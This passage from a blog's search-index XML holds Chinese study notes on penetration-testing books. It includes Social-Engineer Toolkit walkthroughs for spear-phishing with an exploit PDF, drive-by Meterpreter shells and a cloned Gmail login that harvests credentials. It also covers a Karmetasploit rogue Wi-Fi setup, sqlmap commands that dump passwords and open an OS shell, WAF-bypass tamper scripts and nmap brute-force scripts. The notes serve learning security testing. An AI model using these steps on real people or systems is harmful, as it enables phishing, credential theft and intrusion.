+<p>自动检测（AUTO_DETECT）选项是SET最重要的选项之一，是默认打开的,该选项打开后使得SET能够检测到所在主机的IP地址，该地址可以作为反向连接的目标地址或Web服务器架设地址，如果使用多个网络接口，或使用反弹连接攻击荷载并指向了另一个IP地址，那么需要关闭这个选项，关闭后，SET需要确定攻击主机属于哪种配置场景，来确保IP地址使用方式的正确性，例如其中一个场景包含了NET和端口转发的功能，这些配置场景方案的选项在SET接口中可以看到。</p>
+<p>AUTO_DETECT&#x3D;OFF</p>
+<p>当使用工具包的时候，默认会使用基于python 架设的内建web服务，为了优化服务性能，需要把apache_server选项开启，SET将会使用apache服务进行攻击。</p>
+<p>APACHE_SERVER&#x3D;ON</p>
+<h4 id="2-针对性钓鱼攻击向量"><a href="#2-针对性钓鱼攻击向量" class="headerlink" title="2 针对性钓鱼攻击向量"></a>2 针对性钓鱼攻击向量</h4><p>通过特殊构造的文件格式漏洞渗透攻击（例如利用Adobe PDF 漏洞的渗透攻击），主要通过发送邮件附件的方式，将包含渗透代码的文件发送到目标主机。SET使用简单邮件管理协议（SMTP）d 开放代理（匿名的或者需认证的）、Gmail和Sendmail来发送邮件。SET同时也使用标准电子邮件和基于HTML格式的电子邮件来发动钓鱼攻击。</p>
+<p>在这个例子中，我们将会发送存在漏洞代码的PDF格式文件到目标主机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setoolkit</span><br><span class="line">选择1，Social-Engineering Attack(社会工程攻击) </span><br><span class="line">选择1，Spear-Phishing Attack Vectors（矛式网络钓鱼攻击向量）</span><br><span class="line">再次选择1，Perform a Mass Email Attack(执行大规模电子邮件攻击)</span><br><span class="line">选择8，Adobe Collab.collectEmailInfo Buffer Overflow(收集电子邮件信息缓冲区溢出漏洞)</span><br><span class="line">直接回车，选择默认的选项，windows Meterpreter Reverse tcp selected</span><br><span class="line">填写相关的监听IP和端口，更改文件名</span><br><span class="line">选择1，单个E-Mail地址攻击</span><br><span class="line">选择1，Pre-Defined Template（预定义模板）</span><br><span class="line">这个选项是选择吸引用户的主题，有孩子的照片，篮球票，电脑问题等等，我们选择5，状态报告</span><br><span class="line">填写要发送的邮件地址</span><br><span class="line">填写自己的谷歌邮箱和密码。</span><br><span class="line">然后开启监听</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-web攻击向量"><a href="#3-web攻击向量" class="headerlink" title="3 web攻击向量"></a>3 web攻击向量</h4><p>web攻击向量有可能是SET中最先进和令人兴奋的部分，因为它会特意构造出一些对目标而言是可信且具有诱惑力的网页。</p>
+<ol>
+<li><p>Java Applet</p>
+<p>java applet 攻击是SET中最成功的攻击向量之一，该攻击引入了恶意java applet程序进行智能化的浏览器检查，确保applet能在目标浏览器正确运行，同时也能在目标主机运行攻击荷载。Java applet 攻击并不被认为是java本身的漏洞，当受攻击目标浏览器恶意网页的时候，网页会弹出一个警告，问他是否需要运行一个不被信任的Java applet。因为java允许你对一个applet选择任意名字进行签名，通过修改set_config文件，并将WEBATTACK_EMAIL标志位开启。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setoolkit</span><br><span class="line">选择2，website Attack Vectors(网站攻击载体)</span><br><span class="line">选择1，Java applet Attack Method</span><br><span class="line">选择2，site Cloner(站点克隆)</span><br><span class="line">然后选择输入克隆的站点</span><br><span class="line">然后攻击者选择其他的攻击荷载，默认的Meterpreter反向攻击荷载通常是不错的选择，在这个攻击场景中，当选择编码方式和回连端口的时候，攻击者可以直接选择默认选项，再打开MSF监听。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>客户端web攻击</p>
+<p>set还可以利用客户端web渗透攻击模块，要使用客户端渗透攻击，必须前期进行侦察目标系统中存在某种可能的漏洞，set中绝大多数都是针对IE浏览器的，也有针对firefox的，在这个案例中，我们将使用曾用来攻击Google的Aurora攻击向量。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setoolkit</span><br><span class="line">选择2，Website Attack Vectors（网站攻击载体）</span><br><span class="line">选择2，The Metasploit Browser Exploit Method(浏览器攻击方法)</span><br><span class="line">选择2，Site Cloner（站点克隆），然后输入想要克隆的站点，一旦站点被克隆，我们将建立目标用户点击时所触发的漏洞渗透代码。</span><br><span class="line">选择16(你的机器不一定是16)，Microsoft Internet Explorer &quot;Aurora&quot;</span><br><span class="line">选择默认的Meterpreter windows Reverse_tcp和port，我们选择著名的IE Aurora漏洞渗透模块，当目标浏览到咋们设置的网站之后，网页看似正常，但实际上，目标系统已经通过框架（iframe）注入控制了该主机。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用户名和密码获取</p>
+<p>set中的一个相对较新的功能是，它不仅具有克隆网页的功能，而且还能获取登录网页用户的敏感信息，在下一个例子中，set将克隆Gmail的登录界面，同时自动重写POST方法，先把信息POST到set设置的网页服务器上进行窃取，而后再重定向到合法网站上</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">选择2，Website Attack Vectors（网站攻击载体）</span><br><span class="line">选择3，Credential Harvester Attack Method（凭证采集器攻击方法）</span><br><span class="line">选择2，Site Cloner（站点克隆），输入要克隆的站点</span><br><span class="line">然后克隆的站点就会保存在/var/www/html下面，在浏览器中输入192.168.76.128:80 会发现和克隆的站点一摸一样，输入密码提交之后就会发现传到攻击者电脑上了。</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>标签页劫持攻击</p>
+<p>在一次标签页劫持攻击场景中，目标用户在浏览器中打开多个标签页，在访问我们构造的恶意网页时，当点击了一个恶意连接时，网页将展示“页面正在装载，请等待……”的提示消息，而当用户切换标签页时，恶意网页检测到焦点将被转移到另一个标签页，并重写当前页面，向目标用户提示“请等待……”正在转向目标用户所访问网站的信息。</p>
+<p>实际上，目标用户被恶意网页劫持到另一个恶意构造的钓鱼标签页面，并相信他正在访问合法的E-mail应用或业务应用，并被要求登录，输入信息后会被重定向到合法网站。</p>
+</li>
+<li><p>中间人攻击</p>
+<p>中间人攻击使用HTTP referer机制从一个已受控制的网站，或利用跨站脚本漏洞（XSS），将目标用户的敏感信息传递给攻击者的HTTP服务器。</p>
+</li>
+<li><p>网页劫持</p>
+<p>这个功能允许创建一个克隆的网站，然后通过一个声称网站已经被转移至其他地方的链接展现给目标用户，当目标用户将鼠标放在链接上时，显示的是正常URL。这总攻击采用了基于时间的框架替换技术。当点击链接时，启动框架替换，攻击者可以通过修改config&#x2F;set_config选项来修改web劫持的启动时间。</p>
+<p>使用该攻击技术来配置SET，需要选择web jacking attack method 和site cloner，同时还需要输入你想克隆的网站</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setoolkit</span><br><span class="line">选择2，Website Attack Vectors（网站攻击载体）</span><br><span class="line">选择5，web jacking attack method(网页劫持攻击方法)</span><br><span class="line">选择2，Site Cloner（站点克隆），输入要克隆的站点</span><br><span class="line">然后诱导目标访问克隆网站</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>综合多重攻击方法</p>
+<p>综合攻击向量允许攻击者把各种单一的攻击方法串联起来，实施一次多重攻击。允许配置组合不同的攻击向量，生成一个超级邪恶的web页面实施攻击。当目标用户点击链接后，攻击向量依次对目标攻击。</p>
+<p>以下例子中，攻击者将使用Java applet攻击，Metasploit客户端渗透攻击，以及网页劫持攻击。这里选择IE7客户端渗透攻击，而目标用户使用IE6，来显示在一种攻击失败的情况下，其他攻击成功的例子。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">选择2，Website Attack Vectors（网站攻击载体）</span><br><span class="line">选择6，Multi-Attack Web Method(多重攻击方法)</span><br><span class="line">选择2，Site Cloner（站点克隆），输入要克隆的网站</span><br><span class="line">选择1,2,5，选择完成后输入7或者回车生成攻击</span><br><span class="line">都选择默认攻击模块。它会问你是否创建Linux的攻击模块，输入no。</span><br><span class="line">选择Internet Explorer 7 Uninitialized Memory Corruption(MS09-002)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>传染性媒体生成器</p>
+<p>这个生成器SET会创建一个文件夹，可以烧制到CD&#x2F;DVD中，一旦插入目标，Autorun.inf会被自动加载。这个现在有点过时了，毕竟很少人会用到光盘。</p>
+</li>
+<li><p>Teensy USB HID攻击向量</p>
+<p>Teensy USB HID（人机接口设备）攻击向量是定制化硬件和通过键盘模拟绕过限制攻击技术的非凡组合。一般来说，当你插入光盘或者USB时，如果自动播放被关闭，autorun.inf文件就不能自动执行这些恶意文件。但是利用这个攻击向量，可以模拟出一个键盘和鼠标，当插入这个设备的同时，电脑将识别出一个键盘，利用微处理器和主板的闪存存储空间，就可以发送一组键击命令到目标主机，进而控制目标主机。</p>
+</li>
+</ol>
+<h4 id="4-SET-的其他特性"><a href="#4-SET-的其他特性" class="headerlink" title="4. SET 的其他特性"></a>4. SET 的其他特性</h4><p>SET的交互式shell，该交互式shell可以替换Meterpreter作为一个攻击荷载。</p>
+<p>RATTE（Tommy版远程管理工具）：基于HTTP隧道攻击荷载，依赖于HTTP协议进行通信，并利用目标主机的代理设置。当目标主机使用外包监控规则对非HTTP流量进行阻断时，RATTE就显得非常有用了，RATTE还使用blowfish算法来进行HTTP协议上的加密通信。</p>
+<h3 id="0x08-Karmetasploit-无线攻击套件"><a href="#0x08-Karmetasploit-无线攻击套件" class="headerlink" title="0x08 Karmetasploit 无线攻击套件"></a>0x08 Karmetasploit 无线攻击套件</h3><p>Karmetasploit是KARMA在Metasploit框架上的实现，而KARMA是无线攻击套件。KARMA利用 windows XP和MAC OS x操作系统在搜索无线网络时所存在的漏洞，当操作系统启动时，会发送信息寻找之前链接过的无线网络。</p>
+<p>攻击者使用KARMA在他的电脑上搭建一个假冒的AP，然后监听并响应目标发送的信号，并假冒成客户端所寻找的任何类型无线网络。KARMA可以用来控制客户端流量，允许攻击者发动客户端攻击，截获密码等。</p>
+<ol>
+<li><p>配置</p>
+<p>首先配置一个DHCP服务器为目标无线网络分发IP地址，我们需要创建一个自定义文档。配置如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">option domain-name-servers 10.0.0.1;</span><br><span class="line">default-lease-time 60;</span><br><span class="line">max-lease-time 72;</span><br><span class="line">ddns-update-style none;</span><br><span class="line">authoritative;</span><br><span class="line">log-facility local7;</span><br><span class="line">subnet 10.0.0.0 netmask 255.255.255.0 &#123;</span><br><span class="line">	range 10.0.0.100 10.0.0.254;</span><br><span class="line">		option routers 10.0.0.1;</span><br><span class="line">		option domain-name-servers 10.0.0.1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输入命令 cp &#x2F;etc&#x2F;dhcp3&#x2F;dhcpd.conf &#x2F;etc&#x2F;dhcp3&#x2F;dhcp.conf.back备份文档，下载KARMA源文件，<code>wget https://www.offsec.com/wp-content/uploads/2015/04/karma.rc_.txt</code>还需要打开网卡监听<code>airmon-ng start wlan0</code></p>
+</li>
+<li><p>开始攻击</p>
+<p><code>airbase-ng -P -C 30 -e &quot;Free WiFi&quot; -v mon0</code></p>
+<p>-P 响应所有的探测器，-C 30 每30秒发出信号，-v 调试模型</p>
+<p>接下来打开at0接口并运行DHCP服务。</p>
+<p><code>ifconfig at0 up 10.0.0.1 netmask 255.255.255.0</code></p>
+<p><code>dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0</code></p>
+<p>我们可以在MSF中使用rource karma.rc命令加载源文件，或者msfconsole -r karma.rc传递</p>
+</li>
+<li><p>获取凭证</p>
+<p>当客户端连接我们的恶意AP时，我们追踪的消息文件会告诉我们什么时候IP地址被分配了。</p>
+</li>
+<li><p>得到Shell</p>
+<p>在用户浏览网页时，一个伪造的门户页面呈现给了用户，显示的是Loading，因为Karmetasploit正在设置截获cookies，设置虚假邮件，DNS和其他网络服务等。你也可以定制网页，给用户你想看到的。</p>
+</li>
+</ol>
+<hr>
+<p>后面章节内容为如何编写一个Metasploit叫脚本，因为暂时我还不会Ruby语言，所以后面的内容如果感兴趣的话请自己去学习哦。</p>
+]]></content>
+      <categories>
+        <category>读书笔记</category>
+        <category>Metasploit渗透测试指南</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>网络安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>0x02 常用渗透工具</title>
+    <url>/2023/05/15/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97--%E7%AC%AC%E4%B8%89%E7%AB%A0%EF%BC%88%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%EF%BC%89/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="3-1-SQLMap-详解"><a href="#3-1-SQLMap-详解" class="headerlink" title="3.1 SQLMap 详解"></a>3.1 SQLMap 详解</h3><p>sqlmap 是一个自动化的SQL注入工具，内置很多绕过插件，支持市面上大多数据库。一般采用五种SQL注入技术。</p>
+<p>布尔盲注：根据返回页面判断条件真假的注入</p>
+<p>时间盲注：根据页面返回时间判断</p>
+<p>报错注入：页面会返回错误信息</p>
+<p>联合查询注入：使用 Union 的情况下注入</p>
+<p>堆查询注入：执行多条语句的注入</p>
+<p>sqlmap 中有数据库指纹识别、数据库枚举、数据提取、访问目标文件系统。</p>
+<span id="more"></span>
+<h6 id="3-1-1-安装SQLmap-略"><a href="#3-1-1-安装SQLmap-略" class="headerlink" title="3.1.1 安装SQLmap(略)"></a>3.1.1 安装SQLmap(略)</h6><h6 id="3-1-2-入门"><a href="#3-1-2-入门" class="headerlink" title="3.1.2 入门"></a>3.1.2 入门</h6><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">一个参数  sqlmap.py -u http://example.com/sql/?id=1</span><br><span class="line"></span><br><span class="line">多个参数  sqlmap.py -u http://example.com/sql/?id=1&amp;uid=2  会给出可能有漏洞的地方</span><br><span class="line"></span><br><span class="line">txt文档  里面可以写入请求头</span><br><span class="line">sqlmap.py -r 1.txt</span><br><span class="line">-r 表示cookies 注入</span><br><span class="line"></span><br><span class="line">查询当前用户下所有数据库</span><br><span class="line">sqlmap.py -u http://example.com/sql/?id=1 --dbs</span><br><span class="line"></span><br><span class="line">选择查询到的数据库</span><br><span class="line">sqlmap.py -u xxxxxxxxxxxxxxxxxx -D xxxx</span><br><span class="line"></span><br><span class="line">查询选择数据库的表名</span><br><span class="line">sqlmap.py -u xxxxxxxxxxxxxxxxxx -D xxxx --tables</span><br><span class="line"></span><br><span class="line">选择查询到的表</span><br><span class="line">sqlmap.py -u xxxxxxxxxxxxxxxxxx -D xxxx -T yyyy</span><br><span class="line"></span><br><span class="line">查询选择表的列名</span><br><span class="line">sqlmap.py -u xxxxxxxxxxxxxxxxxx -D xxxx -T yyyy --columns</span><br><span class="line"></span><br><span class="line">选择查询到的列名</span><br><span class="line">sqlmap.py -u xxxxxxxxxxxxxxxxxx -D xxxx -T yyyy -C</span><br><span class="line"></span><br><span class="line">获取字段内容</span><br><span class="line">sqlmap.py -u xxxxxxxxxxxxxxxxxx -D xxxx -T yyyy -C id,pass --dump</span><br><span class="line"></span><br><span class="line">读取数据库的所有用户</span><br><span class="line">sqlmap.py -u xxxxxxxxxxxxxxxxxx --users</span><br><span class="line"></span><br><span class="line">获取数据库用户的密码</span><br><span class="line">sqlmap.py -u xxxxxxxxxxxxxxxxxx --passwords</span><br><span class="line"></span><br><span class="line">获取当前网站数据库的名称</span><br><span class="line">sqlmap.py -u xxxxxxxxxxxxxxxxxx --current-db</span><br><span class="line"></span><br><span class="line">获取当权网站数据库的用户名称</span><br><span class="line">sqlmap.py -u xxxxxxxxxxxxxxxxxx --current-user</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-1-2-sqlmap-进阶：参数讲解"><a href="#3-1-2-sqlmap-进阶：参数讲解" class="headerlink" title="3.1.2 sqlmap 进阶：参数讲解"></a>3.1.2 sqlmap 进阶：参数讲解</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--level :探测等级</span><br><span class="line">有5个等级，不加默认是1，5级最慢最全。</span><br><span class="line">1级有get/post注入测试，2级加入http cookie，3级加入http user-agent/Referer</span><br><span class="line"></span><br><span class="line">--is-dba :当前用户是否为管理权限</span><br><span class="line">是 True 否 False</span><br><span class="line"></span><br><span class="line">--roles :列出数据管理员角色（仅适用Oracle）</span><br><span class="line"></span><br><span class="line">--referer: 添加http referer  --level 3 以上</span><br><span class="line"></span><br><span class="line">--sql-shell: 运行自定义SQL语句，自己输入</span><br><span class="line"></span><br><span class="line">--os-cmd,--os-shell 运行任意操作系统命令</span><br><span class="line">MySQL、PostgreSQL时，sqlmap上传一个二进制库，包含用户自定义函数sys_exec()和sys_eval()，即可以执行系统命令</span><br><span class="line">Microsoft SQL server中，使用xp_cmdshell存储过程</span><br><span class="line">使用--os-shell可以模拟真实的shell,可以使用INTO OUTFILE写入web后门</span><br><span class="line"></span><br><span class="line">--file-read: 从数据库服务器中读取文件</span><br><span class="line">MySQL、PostgreSQL、Microsoft SQL Server有权限时可以读取文件</span><br><span class="line"></span><br><span class="line">--file-write --file-dest: 上传文件到数据库服务器中</span><br><span class="line">还是以上三种SQL类型，</span><br><span class="line">sqlmap.py -u xxxxxxxxxxxxxx --file-write xxx.exe --file-dest xxx.exe -v 1</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-1-4-sqlmap-自带绕过脚本-tamper-的讲解"><a href="#3-1-4-sqlmap-自带绕过脚本-tamper-的讲解" class="headerlink" title="3.1.4 sqlmap 自带绕过脚本 tamper 的讲解"></a>3.1.4 sqlmap 自带绕过脚本 tamper 的讲解</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tamper：一个最小的tamper 脚本结构为priority变量定义和dependencies、tamper函数定义。</span><br><span class="line">  priority定义脚本的优先级，用于有多个tamper脚本的情况</span><br><span class="line">  dependencies函数声明该脚本适用/不适用的范围，可以为空</span><br><span class="line">tamper函数接收payload和**kwargs，并返回一个payload.</span><br><span class="line"></span><br><span class="line">用于绕过（WAF/IDS/IPS),可以对网站进行试探，使用参数 --identify-waf</span><br><span class="line"></span><br><span class="line">常用的tamper脚本</span><br><span class="line">apostrophemask.py 将引号替换为UTF-8，过滤单引号</span><br><span class="line">base64encode.py  替换为base64编码</span><br><span class="line">multiplespaces.py 围绕SQL关键字添加多个空格</span><br><span class="line">space2plus.py  用+号代替空格</span><br><span class="line">nonrecursivereplacement.py   作为双重查询语句，用双重语句代替预定义的SQL关键字</span><br><span class="line">space2randomblank.py   将空格替换为其他有效字符</span><br><span class="line">unionalltounion.py   将UNION ALL SELECT 替换为UNION SELECT</span><br><span class="line">securesphere.py   追加特制的字符串</span><br><span class="line">space2hash.py   将空格替换为#号，并添加一个随机字符串和换行符</span><br><span class="line">space2mssqlblank.py(mssql)  将空格替换为其他空字符</span><br><span class="line">space2mssqlhash.py  将空格替换为#号，并添加一个换行符</span><br><span class="line">between.py     用NOT BETWEEN 0 AND 替换大于号， 用BETWEEN AND 替换等号</span><br><span class="line">percentage.py   ASP允许在每个字符前面添加一个%号</span><br><span class="line">sp_password.py   从DBMS日志的自动模糊处理的有效荷载中追加sp_password</span><br><span class="line">charencode.py   对给定的Payload全部字符使用URL编码（不处理已经编码的字符）</span><br><span class="line">randomcase.py     随机大小写</span><br><span class="line">charunicodeencode.py   字符串unicode编码</span><br><span class="line">space2comment.py    将空格替换为/**/</span><br><span class="line">equaltolike.py    将等号替换为like</span><br><span class="line">greatest.py     绕过对”&gt;“ 的过滤，用GREATEST替换大于号</span><br><span class="line">ifnull2ifisnull.py  绕过对IFNULL的过滤，替换类似IFNULL(A,B)为IF(ISNULL(A),B,A)</span><br><span class="line">modsecurityversioned.py   过滤空格，使用MySQL内联注释的方法进行注入</span><br><span class="line">space2mysqldash.py  将空格替换为--，并添加一个换行符</span><br><span class="line">bluecoat.py   在SQL语句之后用有效的随机空白符替换空格符，用LIKE替换等于号</span><br><span class="line">versionedkeywords.py  注释绕过</span><br><span class="line">halfversionedmorekeywords.py   当数据库为MySQL时绕过防火墙，在每个关键字之前添加MySQL版本注释</span><br><span class="line">space2morehash.py   将空格替换为#号，并添加一个随机字符串</span><br><span class="line">apostrophenullencode.py   用非法双字节unicode字符替换单引号</span><br><span class="line">appendnullbyte.py    在有效负荷的结束位置加载字节字符编码</span><br><span class="line">chardoubleencode.py   对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</span><br><span class="line">unmagicquotes.py   用一个多字节组合（%bf%27）和末尾通用注释一起替换空格</span><br><span class="line">randomcomments.py   用/**/分割SQL关键字</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-BurpSuite-详解"><a href="#3-2-BurpSuite-详解" class="headerlink" title="3.2 BurpSuite 详解"></a>3.2 BurpSuite 详解</h3><h4 id="3-2-1-bp安装"><a href="#3-2-1-bp安装" class="headerlink" title="3.2.1 bp安装"></a>3.2.1 bp安装</h4><p>略</p>
+<h4 id="3-2-2-入门"><a href="#3-2-2-入门" class="headerlink" title="3.2.2 入门"></a>3.2.2 入门</h4><p>bp代理工具以拦截所有通过代理的网络流量，可以进行修改，再次提交</p>
+<p>spider模块：爬行功能可以帮我们了解目标系统的结构</p>
+<p>Decoder模块：解码平台</p>
+<h4 id="3-2-3-Bp-进阶"><a href="#3-2-3-Bp-进阶" class="headerlink" title="3.2.3 Bp 进阶"></a>3.2.3 Bp 进阶</h4><p>Scanner : 主要用与自动化检测web系统的各种漏洞。</p>
+<h3 id="3-3-Nmap-详解"><a href="#3-3-Nmap-详解" class="headerlink" title="3.3 Nmap 详解"></a>3.3 Nmap 详解</h3><p>nmap 特点：主机探测，探测网络上的主机，端口扫描：探测目标主机开放的端口。版本扫描：探测目标主机服务，判断服务名称和版本号。系统监测：探测目标主机的操作系统及网络设备的硬件特性。支持脚本编写。</p>
+<h4 id="3-3-1安装：-略"><a href="#3-3-1安装：-略" class="headerlink" title="3.3.1安装： 略"></a>3.3.1安装： 略</h4><h4 id="3-3-2-入门"><a href="#3-3-2-入门" class="headerlink" title="3.3.2 入门"></a>3.3.2 入门</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">扫描参数</span><br><span class="line">-iL: 从文件中导入目标主机或目标网段</span><br><span class="line">-iR: 随机选择目标主机</span><br><span class="line">--exclude: 排除的主机或网段，即不扫描</span><br><span class="line">--excludefile: 排除的主机或网段文件</span><br><span class="line"></span><br><span class="line">-sL: list scan，仅列举指定目标ip，不进行主机发现</span><br><span class="line">-sn: ping scan，只进行主机发现，不进行端口扫描</span><br><span class="line">-Pn: 将所有指定的主机当作已开启，跳过主机发现过程。</span><br><span class="line">-PS/PA/PU/PY：使用TCP SYN/ACK或者SCTP INIT/ECHO方式来发现</span><br><span class="line">-PE/PP/PM: 使用ICMP echo、timestamp、netmask请求包发现主机</span><br><span class="line">-PO: 使用IP协议包探测对方主机是否存活</span><br><span class="line">-n/-R：-n 表示不进行DNS解析，-R表示总是进行DNS解析。</span><br><span class="line">--dns-servers: 指定DNS服务器</span><br><span class="line">--system-dns: 指定使用系统的DNS服务器</span><br><span class="line">--traceroute: 追踪每个路由节点</span><br><span class="line"></span><br><span class="line">-sS/sT/sA/sW/sM: 指定使用TCP SYN/Connect()/ACK/Window/Maimon scans的方式对目标主机进行扫描</span><br><span class="line">-sU: 指定使用UDP扫描主机和端口</span><br><span class="line">-sN/sF/sX: 指定使用TCP NULL/FIN/Xmac scans 秘密扫描方式扫描端口</span><br><span class="line">--scanflags: 定制TCP包的flags</span><br><span class="line">-sI： 指定使用Idle scan 的方式扫描目标主机</span><br><span class="line">-sY/sZ: 使用SCTP INIT/COOKIE-ECHO 扫描SCTP协议端口</span><br><span class="line">-sO: 使用IP protocol扫描确定目标支持的协议类型</span><br><span class="line">-b: 使用FTP bounce scan扫描方式</span><br><span class="line"></span><br><span class="line">-p: 指定端口扫描  -p- 全端口扫描</span><br><span class="line">-F: Fast mode 快速扫描，仅扫描TOP 100的端口</span><br><span class="line">-r: 不进行端口随机打乱的操作，一般是随机顺序进行扫描的</span><br><span class="line">--top-ports: 扫描开放概率最高的n 个端口</span><br><span class="line">--port-ratio: 扫描指定频率以上的端口，参数在0~1之间</span><br><span class="line"></span><br><span class="line">-sV：指定让nmap 进行版本侦测</span><br><span class="line">--version-intensity: 指定版本侦测强度（0~9），默认为7，数值越高越准确越慢</span><br><span class="line">--version-light：指定使用轻量级侦测方式  级别为2</span><br><span class="line">--version-all:  级别为9</span><br><span class="line">--version-trace: 显示出详细的版本侦测过程信息</span><br></pre></td></tr></table></figure>
+
+<p>nmap 扫描端口的状态：</p>
+<p>open   开放的</p>
+<p>filtered      被过滤的，及扫描时被阻止</p>
+<p>closed      关闭的</p>
+<p>unfiltered   未被过滤，要进一步探测</p>
+<p>open&#x2F;filtered      不确定是开放还是过滤的</p>
+<p>closed&#x2F;filtered   不确定关闭还是过滤的</p>
+<h4 id="3-3-3-Nmap-进阶"><a href="#3-3-3-Nmap-进阶" class="headerlink" title="3.3.3 Nmap 进阶"></a>3.3.3 Nmap 进阶</h4><p>nmap 脚本默认存在&#x2F;xx&#x2F;nmap&#x2F;scripts文件下。主要有以下几类</p>
+<p>auth: 负责处理鉴权证书（绕过鉴权）的脚本</p>
+<p>Broadcast: 在局域网内探查更多服务的开启情况，如DHCP&#x2F;DNS&#x2F;SQLServer等</p>
+<p>Brute: 针对常见的应用提供暴力破解方式，如http&#x2F;smtp等</p>
+<p>Default:  使用-sC 或-A 扫描时默认的脚本</p>
+<p>Discovery: 对网络进行更多信息的搜集，如SMB枚举、SNMP查询等</p>
+<p>DOS: 用于进行拒绝服务工具</p>
+<p>Exploit: 利用已知的漏洞入侵系统</p>
+<p>external: 利用第三方的数据库或资源。例：进行Whois解析</p>
+<p>fuzzer: 模糊测试脚本，发送一场的包到目标机，探测出潜在漏洞</p>
+<p>Intrusive : 入侵性脚本，此类脚本可能引发对方的IDS&#x2F;IPS的记录或屏蔽</p>
+<p>Malware: 与intrusive 相反，属于安全性脚本</p>
+<p>version: 负责增强服务与版本扫描功能的脚本</p>
+<p>vuln:  负责检查目标及是否有常见漏洞</p>
+<h6 id="常见脚本"><a href="#常见脚本" class="headerlink" title="常见脚本"></a>常见脚本</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--script=  选择脚本</span><br><span class="line"></span><br><span class="line">-sC/--script=default  使用默认脚本</span><br><span class="line">--script=xxxxx    </span><br><span class="line">--script-args=key1=p1,key2=p2  该参数用于传递脚本里的参数</span><br><span class="line">--script-args-files=filename  使用文件为脚本提供参数</span><br><span class="line">--script-trace    如果设置该参数，则显示脚本执行过程中发送与接受的数据</span><br><span class="line">--script-updatedb   脚本数据库更新</span><br><span class="line">--script-help   输出指定脚本的使用参数</span><br></pre></td></tr></table></figure>
+
+<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">鉴权扫描</span><br><span class="line">nmap --script=auth xxx.xxx.xx.xx</span><br><span class="line"></span><br><span class="line">暴力破解攻击</span><br><span class="line">nmap --script=brute xxx.xxx.xx.xx</span><br><span class="line"></span><br><span class="line">扫描常见漏洞</span><br><span class="line">nmap --script=vuln xxx.xx.xx.xx</span><br><span class="line"></span><br><span class="line">应用服务扫描</span><br><span class="line">nmap --script=realvnc-auth-bypass xxx.xxx.xx.xx</span><br><span class="line"></span><br><span class="line">探测局域网内更多服务开启情况</span><br><span class="line">nmap -n -p 445 --script=broadcast xxx.xx.xxx.xx</span><br><span class="line"></span><br><span class="line">whois 解析</span><br><span class="line">nmap -script external baidu.com</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>读书笔记</category>
+        <category>Web安全攻防：渗透测试指南</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>网络安全</tag>
+        <tag>读书笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>0x04 PowerShell 攻击</title>
+    <url>/2023/05/15/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%EF%BC%9A%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97--%E7%AC%AC%E5%85%AD%E7%AB%A0%EF%BC%88PowerShell%20%E6%94%BB%E5%87%BB%EF%BC%89/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="6-1-PowerShell技术"><a href="#6-1-PowerShell技术" class="headerlink" title="6.1 PowerShell技术"></a>6.1 PowerShell技术</h3><p>常用的powershell 攻击工具</p>
+<p>powersploit : 常用的后期漏洞利用框架，常用于信息探测、特权提升、凭证窃取、持久化控制等操作。</p>
+<p>Nishang: 集成了框架、脚本和各种payload，包含下载和执行、键盘记录、DNS、延时命令等脚本。</p>
+<p>Empire：基于powershell 的远程控制木马，可以从凭证数据库中导出和跟踪凭证信息</p>
+<p>powercat</p>
